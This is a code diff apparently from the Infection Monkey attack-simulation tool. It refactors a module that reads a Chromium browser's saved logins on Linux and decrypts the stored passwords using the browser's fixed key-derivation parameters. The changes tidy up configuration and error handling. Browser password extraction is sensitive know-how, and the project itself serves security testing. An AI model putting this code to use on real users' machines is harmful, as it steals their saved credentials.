@@ -3,7 +3,7 @@ import logging
 import os
 import shutil
 import sqlite3
-import struct
+from dataclasses import dataclass
 from hashlib import pbkdf2_hmac
 from itertools import chain
 from pathlib import Path, PurePath
@@ -17,15 +17,24 @@ from infection_monkey.utils.threading import interruptible_iter
 
 from .decrypt import AESModeOfOperationCBC, decrypt_v80
 
+
+@dataclass
+class EncryptionConfig:
+    iv: bytes
+    length: int
+    salt: bytes
+    iterations: int
+
+
 logger = logging.getLogger(__name__)
 
 AES_BLOCK_SIZE = 16
-ENC_CONFIG = {
-    "iv": b" " * 16,
-    "length": 16,
-    "salt": b"saltysalt",
-    "iterations": 1,
-}
+ENC_CONFIG = EncryptionConfig(
+    iv=b" " * 16,
+    length=16,
+    salt=b"saltysalt",
+    iterations=1,
+)
 
 from .browser_credentials_database_path import BrowserCredentialsDatabasePath
 
@@ -60,7 +69,12 @@ class LinuxCredentialsDatabaseProcessor:
         for user, password in connection.execute(
             "SELECT username_value,password_value FROM logins"
         ):
-            yield Credentials(identity=Username(username=user), secret=self._get_password(password))
+            try:
+                yield Credentials(
+                    identity=Username(username=user), secret=self._get_password(password)
+                )
+            except Exception:
+                continue
 
     def _get_password(self, password: str) -> Password:
         if self._is_password_encrypted(password):
@@ -79,14 +93,14 @@ class LinuxCredentialsDatabaseProcessor:
                 enc_key = pbkdf2_hmac(
                     hash_name="sha1",
                     password=css,
-                    salt=ENC_CONFIG["salt"],
-                    iterations=ENC_CONFIG["iterations"],
-                    dklen=ENC_CONFIG["length"],
+                    salt=ENC_CONFIG.salt,
+                    iterations=ENC_CONFIG.iterations,
+                    dklen=ENC_CONFIG.length,
                 )
 
                 try:
                     plaintext = self._chrome_decrypt(
-                        password, key=enc_key, init_vector=ENC_CONFIG["iv"]
+                        password, key=enc_key, init_vector=ENC_CONFIG.iv
                     )
                     return plaintext.decode()
                 except UnicodeDecodeError:
@@ -95,6 +109,10 @@ class LinuxCredentialsDatabaseProcessor:
                         return plaintext
         except Exception:
             logger.exception("Failed to decrypt password")
+            raise
+
+        # If we get here, we failed to decrypt the password
+        return password
 
     def _chrome_decrypt(self, encrypted_value, key, init_vector):
         encrypted_value = encrypted_value[3:]
@@ -111,10 +129,7 @@ class LinuxCredentialsDatabaseProcessor:
         """
         Remove PKCS#7 padding
         """
-        try:
-            nb = struct.unpack("B", data[-1])[0]  # Python 2
-        except Exception:
-            nb = data[-1]  # Python 3
+        nb = data[-1]
 
         try:
             return data[:-nb]
